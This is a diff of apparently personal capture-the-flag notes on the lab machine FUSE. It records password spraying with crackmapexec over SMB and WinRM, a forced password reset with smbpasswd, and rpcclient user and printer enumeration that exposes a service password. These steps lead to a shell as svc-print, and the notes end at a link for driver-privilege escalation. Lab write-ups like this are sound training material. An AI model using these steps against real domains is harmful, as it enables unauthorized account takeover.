@@ -39,5 +39,80 @@ hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule users > passwor
 * Looking through ldapsearch gets me nothing useful *
 ldapsearch -h 10.10.10.193 -x -b "DC=FABRICORP,DC=local" '(objectClass=Person)'
 
+* Trying crackmapexec with the users we have found and password "Fabricorp01" notice that some users return the message "STATUS_PASSWORD_MUST_CHANGE" *
+$crackmapexec smb 10.10.10.193 -u users -p "Fabricorp01" 
+SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:FABRICORP) (signing:True) (SMBv1:True)
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\pmerton:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\sthompson:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\papercut:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\FUSE:Fabricorp01 STATUS_LOGON_FAILURE 
+SMB         10.10.10.193    445    FUSE             [-] FABRICORP\Fabricorp:Fabricorp01 STATUS_LOGON_FAILURE 
 
-the user password requires password spraying and the data come propably from the web page
+* Using one of the users with the "STATUS_PASSWORD_MUST_CHANGE" message we change his password *
+smbpasswd -r 10.10.10.193 -U bhult
+
+The password resets after a few minutes it seems so we need to be quick
+
+* Connecting to rpcclient we can enumerate for some more users to add to our list * 
+rpcclient -L fuse.htb -U tlavel
+enumdomusers
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+
+
+* Looking at the website available on port 80 we see that it hosts an application resolving around printers and rpcclient allows us to enumerate connected printers *
+enumprinters
+
+flags:[0x800000]
+	name:[\\10.10.10.193\HP-MFT01]
+	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+	comment:[]
+
+We found a password 
+
+* Running crackmapexec again with the new password and users on winrm service the get a valid log in*
+crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1'
+WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\bnielson:$fab@s3Rv1ce$1 "Failed to authenticate the user bnielson with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\pmerton:$fab@s3Rv1ce$1 "Failed to authenticate the user pmerton with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\tlavel:$fab@s3Rv1ce$1 "Failed to authenticate the user tlavel with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\sthompson:$fab@s3Rv1ce$1 "Failed to authenticate the user sthompson with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\bhult:$fab@s3Rv1ce$1 "Failed to authenticate the user bhult with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\papercut:$fab@s3Rv1ce$1 "Failed to authenticate the user papercut with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\FUSE:$fab@s3Rv1ce$1 "Failed to authenticate the user FUSE with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\Fabricorp:$fab@s3Rv1ce$1 "Failed to authenticate the user Fabricorp with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\Administrator:$fab@s3Rv1ce$1 "Failed to authenticate the user Administrator with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\Guest:$fab@s3Rv1ce$1 "Failed to authenticate the user Guest with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\krbtgt:$fab@s3Rv1ce$1 "Failed to authenticate the user krbtgt with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\DefaultAccount:$fab@s3Rv1ce$1 "Failed to authenticate the user DefaultAccount with ntlm"
+WINRM       10.10.10.193    5985   FUSE             [+] FABRICORP\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
+
+
+* Executing command "Whoami /priv" shows us our user privilages *
+
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeLoadDriverPrivilege         Load and unload device drivers Enabled --> Common privilage for printer users, good for privesc
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+* Following privesc from https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege *
+
